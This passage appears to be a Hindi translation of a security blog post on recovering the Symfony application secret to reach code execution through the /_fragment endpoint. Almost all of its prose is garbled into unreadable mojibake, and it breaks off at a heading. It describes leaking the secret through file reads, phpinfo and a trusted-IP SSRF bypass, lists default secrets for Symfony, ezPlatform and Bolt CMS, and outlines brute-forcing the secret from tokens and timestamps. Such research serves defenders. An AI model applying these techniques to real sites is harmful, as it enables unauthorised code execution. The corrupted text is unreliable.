рдлрд┐рд░ рд╕реЗ: рдпрджрд┐ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рдирд╣реАрдВ рд╣реЛрддреЗ рддреЛ рдпрд╣ рд╕рдм рдорд╛рдпрдиреЗ рдирд╣реАрдВ рд░рдЦрддрд╛ред рдЕрдХреНрд╕рд░ рд╡реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВред рд╣рдо рдХрдИ рддрд░реАрдХреЛрдВ рдХрд╛ рд╡рд░реНрдгрди рдХрд░реЗрдВрдЧреЗ рдЬрд┐рдирд╕реЗ рдХреЛрдИ рдкреВрд░реНрд╡ рдЬреНрдЮрд╛рди рдХреЗ рдмрд┐рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рд╕рдВрдХрдЯреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

рдЖрдЗрдП рд╕рд╛рдорд╛рдиреНрдп рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реАрдХреНрд░реЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░реЗрдВред

#### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ <a href="#file-read" id="file-read"></a>

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ, рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдФрд░ `secret` рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* `app/config/parameters.yml`
* `.env`

_рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рдХреБрдЫ Symfony рдбреАрдмрдЧ рдЯреВрд▓рдмрд╛рд░ рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

рд╣рд╛рд▓ рдХреЗ Symfony рд╕рдВрд╕реНрдХрд░рдгреЛрдВ (3.x) рдкрд░, `secret` рдХреЛ `.env` рдореЗрдВ `APP_SECRET` рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдпрд╛рддрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕реЗ `phpinfo()` рдкреГрд╖реНрда рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

_phpinfo рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ APP\_SECRET рд▓реАрдХ рд╣реЛ рд░рд╣рд╛ рд╣реИ_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

рдпрд╣ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрдХреЗрддрдкреВрд░реНрдг рд░реВрдк рд╕реЗ Symfony рдХреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓рд░ рдкреИрдХреЗрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### SSRF / IP рд╕реНрдкреВрдлрд┐рдВрдЧ (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener` рдХреЗ рдкреАрдЫреЗ рдХрд╛ рдХреЛрдб рд╕рдВрд╡рд░реНрдзрд┐рдд рд╣реЛ рдЧрдпрд╛ рд╣реИ: рд╕рдВрд╕реНрдХрд░рдг _2.5.3_ рддрдХ, рдЬрдм рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкреНрд░реЙрдХреНрд╕реА рд╕реЗ рдЖрдпрд╛ рдерд╛ (рдЕрд░реНрдерд╛рддреН `localhost`), рддреЛ рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рдерд╛, рдФрд░ рдЗрд╕рд▓рд┐рдП рд╣реИрд╢ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рдереАред рдПрдХ SSRF, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `secret` рд╣реЛ рдпрд╛ рди рд╣реЛ, рдХреЛрдб рдХреЛ рддреБрд░рдВрдд рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкреНрд░рдореБрдЦ рдкреНрд░рднрд╛рд╡ eZPublish up to 2014.7 рдкрд░ рдкрдбрд╝рддрд╛ рд╣реИред
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЙрди рд╕рднреА рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╕рдВрдХрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЪрд▓реЛ рдПрдХ рдФрд░ рдмреЗрд╣рддрд░ рд╡реЗрдХреНрдЯрд░ рдореЗрдВ рдЦреБрдж рдХреЛ рдбрд╛рд▓рддреЗ рд╣реИрдВ: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рдиред

### рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Symfony рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХрд░рддреЗ рд╕рдордп, рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ [symfony-standard](https://github.com/symfony/symfony-standard) рд╕реНрдХреЗрд▓реЗрдЯрди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ред рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдиреЗ рдкрд░, рдПрдХ рдкреНрд░реЙрдореНрдкреНрдЯ рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди рдХрд╛ рдХреБрдВрдЬреА `ThisTokenIsNotSoSecretChangeIt` рд╣реИред

_рдХрдВрдкреЛрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Symfony рдХреА рд╕реНрдерд╛рдкрдирд╛_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

рдмрд╛рдж рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ (4+), рд╕реАрдХреНрдпреЛрд░рд▓реА рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред

#### ezPlatform 3.x (рдирд╡реАрдирддрдо): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish) рдХрд╛ рдЙрддреНрддрд░рд╛рдзрд┐рдХрд╛рд░реА, рдЕрднреА рднреА Symfony рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред 10 рдЬреВрди, 2019 рдХреЛ, рдПрдХ [рдХрдорд┐рдЯ](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) рдиреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреБрдВрдЬреА рдХреЛ `ff6dc61a329dc96652bb092ec58981f7` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ред рд╕рдВрдХрдЯрдкреВрд░реНрдг рд╕рдВрд╕реНрдХрд░рдг 3.0-alpha1 рд╕реЗ 3.1.1 (рд╡рд░реНрддрдорд╛рди) рддрдХ рд╣реИрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) рдореЗрдВ рдпрд╣ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдмрджрд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдпрд╣ рдкреНрд░рд╡рд░реНрддрд┐рдд рдирд╣реАрдВ рд╣реИред

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Symfony рдХреЗ рд╕реНрдХреЗрд▓реЗрдЯрди рдХреА рддрд░рд╣, рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рджреМрд░рд╛рди рдЖрдкрд╕реЗ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` рд╣реИред

#### Bolt CMS <= 3.7 (рдирд╡реАрдирддрдо): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) [Silex](https://github.com/silexphp/Silex) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ Symfony рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдХ рдкреБрд░рд╛рдирд╛ рдорд╛рдЗрдХреНрд░реЛ-рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИред рдпрд╣ рдЧрдгрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ:
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдХреЛрдИ рдЧреБрдкреНрдд рдЬрд╛рди рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рдЗрд╕реЗ рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреВрд░реНрдг рдкрде рд╡рд┐рдХрд▓реНрдк рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╕рдлрд▓ рдирд╣реАрдВ рд╣реБрдП рд╣реИрдВ, рддреЛ рдирд┐рд░рд╛рд╢ рди рд╣реЛрдВ: рдпрд╣рд╛рдВ рдЕрдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВред

### рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ <a href="#bruteforce" id="bruteforce"></a>

рдЬрдм рдЧреБрдкреНрдд рдЖрдорддреМрд░ рдкрд░ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдпрд╛рдиреА рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ), рддреЛ рд▓реЛрдЧ рдЕрдХреНрд╕рд░ рдПрдХ рдкрд╛рд╕рдлреНрд░реЗрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдмрдЬрд╛рдп рд╕реБрд░рдХреНрд╖рд┐рдд рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдорд╛рди рдХрд╛, рдЬрд┐рд╕рд╕реЗ рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЗрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдо рдЗрд╕реЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ, рдПрдХ рдорд╛рдиреНрдп `/_fragment` URL, рдЬреИрд╕рд╛ рдХрд┐ Symfony рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛрдЧрд╛, рд╣рдореЗрдВ рдПрдХ рдорд╛рдиреНрдп рд╕рдВрджреЗрд╢-рд╣реИрд╢ рдЯрдкрд▓ рдХреА рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдЧреБрдкреНрдд рдХреЛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

_рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдлреНрд░реЗрдЧрдореЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рд╢рд╛рдорд┐рд▓ рд╣реИ_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ, рд╣рдордиреЗ рдХрд╣рд╛ рдерд╛ рдХрд┐ Symfony рдХрд╛ рдЧреБрдкреНрдд рдХрдИ рдЙрдкрдпреЛрдЧ рд╣реИред рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧ CSRF рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `рдЧреБрдкреНрдд` рдХрд╛ рдПрдХ рдФрд░ рдЙрдкрдпреЛрдЧ remember-me рдХреБрдХреАрдЬрд╝ рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдирд╛ рд╕реНрд╡рдпрдВ рдХрд╛ CSRF рдЯреЛрдХрди рдпрд╛ remember-me рдХреБрдХреАрдЬрд╝ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `рдЧреБрдкреНрдд` рдХреЗ рдорд╛рди рдХреЛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

_рдЗрди рдЯреЛрдХрдиреНрд╕ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреЗ рдкрд╛рд▓рди рдХрд╛ рд░рд┐рд╡рд░реНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдкрд╛рдардХ рдХреЛ рд╕реНрд╡рдпрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред_

### рдФрд░ рдЖрдЧреЗ рдмрдврд╝реЗрдВ: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдХреЛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рд╣рдо рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рд╣рдо рдХреИрд╕реЗ eZPublish 2014.07 рдХрд╛ рдЧреБрдкреНрдд рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

#### рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рд╕рд╛рдордЧреНрд░реА рдЦреЛрдЬрдирд╛ <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish рдЕрдкрдиреЗ CSRF рдЯреЛрдХрдиреНрд╕ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ:
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
рдЗрд╕ рдЯреЛрдХрди рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, eZP рджреЛ рдорд╛рди рдФрд░ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ: `getIntention()` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдпрд╛рд╕ рдХреА рдЬрд╛ рд░рд╣реА рдХреНрд░рд┐рдпрд╛ рд╣реИ (`рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░реЗрдВ` рдЬреИрд╕реЗ), `session_id()` PHP рд╕рддреНрд░ рдЖрдИрдбреА рд╣реИ, рдФрд░ `getSecret()`, рд╡реЗрд▓, рд╕рд┐рдордлреЛрдиреА рдХрд╛ `рд╕реАрдХреНрд░реЗрдЯ` рд╣реИред

CSRF рдЯреЛрдХрди рдХреЛ рдХреБрдЫ рдлреЙрд░реНрдореЛрдВ рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рд╣реИред

рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, ezPublish рдиреЗ sensiolabs рд╕реЗ рдПрдХ рдмрдВрдбрд▓ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд┐рдпрд╛, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)ред рдпрд╣ рдкреИрдХреЗрдЬ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛрддреА рд╣реИред рдпрд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ, рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рд╕рдордп:
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
рдпрд╣ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдирд╛ рдмрд╣реБрдд рдореБрд╢реНрдХрд┐рд▓ рд▓рдЧ рд░рд╣рд╛ рд╣реИ: `mt_rand()` 231 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдорд╛рди рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ `uniqid()` рдореМрдЬреВрджрд╛ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк (рдорд╛рдЗрдХреНрд░реЛрд╕реЗрдХрдВрдб рдХреЗ рд╕рд╛рде) рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдЦреБрд▓рд╛рд╕рд╛ рдХрд░рдирд╛ <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рддрд░реАрдХреЗ рд╕реЗ, рд╣рдореЗрдВ рдпрд╣ рдкрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд░рд╣рд╕реНрдп рдкрд┐рдЫрд▓реЗ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рдЪрд░рдг рдХреЗ рдмрд╛рдж рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ, рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХреЗ рдмрд╛рджред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╢рд╛рдпрдж рдЗрд╕ рд╣реИрд╢ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рд▓реЙрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ (_рдЙрджрд╛ред_ `/var/log/storage.log`); рдХреЛрдИ рд╡реНрдпрдХреНрддрд┐ рдкрд╣рд▓реА рдмрд╛рд░ рдЬрдм рдХреИрд╢ рдПрдВрдЯреНрд░реА рдмрдирд╛рдИ рдЧрдИ рдереА, рдЙрд╕ рд╕рдордп рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдХреИрд╢ рдПрдВрдЯреНрд░реА `generateRandomSecret()` рдХреЙрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред

_рдирдореВрдирд╛ рд▓реЙрдЧ рд╕рд╛рдордЧреНрд░реА: рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рд╕реАрдХреНрд░реЗрдЯ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рдорд╛рди рд╣реИ_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

рдпрджрд┐ рд▓реЙрдЧреНрд╕ рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИрдВ, рддреЛ рдПрдЬреАрдЬреАрдкрдмреНрд▓рд┐рд╢ рдХреЗ рдмрд╣реБрдд рд╣реА рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╕рд░реНрдЪ рдЗрдВрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рдкрд╣рд▓реЗ рддрддреНрд╡ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рд╕рдордп рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдЬрдм рд╕рд╛рдЗрдЯ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдХрдИ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдбрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдЬреАрдЬреАрдкрдмреНрд▓рд┐рд╢ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдбреЗрдЯрд╛ рдХрд╛ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк `uniqid()` рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИред рд╣рдо `landing_page` _ContentObject_ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХрд╛ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред

## рдЧреБрдо рдЕрдВрд╢реЛрдВ рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдирд╛ <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

